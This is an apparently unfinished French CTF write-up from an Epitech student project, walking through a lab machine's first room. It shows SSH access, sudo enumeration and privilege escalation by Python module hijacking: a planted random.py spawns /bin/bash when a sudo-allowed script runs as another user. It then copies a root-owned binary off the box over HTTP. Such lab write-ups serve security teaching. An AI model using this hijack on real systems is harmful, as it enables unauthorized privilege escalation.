Ceci est la documentation pour le projet Epitech SOCAT. Il s'agit d'un CTF (capture the flag).

## Sujet Traité :

Etude des vulnérabilités de machines virtuelles.

## Liste non exhaustive des domaines que nous couvrirons :
Authentification, ACL, configuration, cryptographie, encodage, gestion des erreurs, protocoles, synchronisation, pièges de langage, escalade de privilèges, etc.



# Room 1 - Toss a coin 

## user.txt ?


## root.txt ?

### Jaskier


- Nous avons ce qui semble être le mot de passe de Jaskier, on peut se connecter en SSH à la machine en tant qu'utilisateur Jaskier.
    ```bash
    ssh jaskier@10.10.250.243
    ```
- Commençons par regarder ce qu'il y a dans le dossier personnel de Jaskier.
    ```bash
    ls -lha
    ```
- Il y a un script python. Il importe le module random et l'utilise pour sélectionner dix lignes aléatoires de la chanson.
- On vérifie ce que l'utilisateur Jaskier peut exécuter en tant que sudo afin de nous indiquer à qui nous allons élever nos privilèges en premier.
    ```bash
    sudo -l
    ```
- Nous pouvons exécuter ce script python dans notre dossier en tant que utilisateur yen.
- Un module est juste un fichier python avec des fonctions qui peuvent être référencées. Ainsi, lorsque la ligne d'importation aléatoire est exécutée, le script recherche ce fichier random.py. Nous pouvons savoir où il recherche ce fichier random.py.

    ```bash
  python3.6 -c 'import sys; print(sys.path)'
    ```
- Nous pouvons voir qu'il recherche le fichier random.py dans le dossier /home/jaskier (['']).
- Donc, si on crée un fichier random.py dans ce répertoire, le script python ferait référence à ce fichier car c'est le premier endroit où il vérifie.

   ```bash
    nano random.py
    ```
   ```python
    import os
    os.system("/bin/bash")
  ```
    
- Et maintenant, nous exécutons le script python en tant que sudo.
    ```bash
    sudo -u yen /usr/bin/python3.6 /home/jaskier/toss_a_coin.py
    ```
- Et nous obtenons un shell en tant qu'utilisateur yen.


### yen

- Commençons par regarder ce qu'il y a dans le dossier personnel de yen.
    ```bash
    ls -lha
    ```
  
- Nous avons un fichier qui appartient à root, mais lisible par yen. Il semble que nous ayons besoin d'un autre niveau de privesc.
- Une fois executé nous obtenons un segfault, après avoir vérifié avec valgrind on se rend compte que c'est un faux segfautl. Donc probablement pas un d'erreur mémoire exploitable. 
- Mettons le fichier dans machine hôte et regardons-le.
    ```bash
    python3 -m http.server 8000
    ```
- Sur notre machine hote
  ```bash
  wget http://10.10.250.243:8000/portals
  ```
  ```bash
  strings portals
  ```
    


# Room 2 - Yer a Wizard


# Room 3 - Yer a Wizard
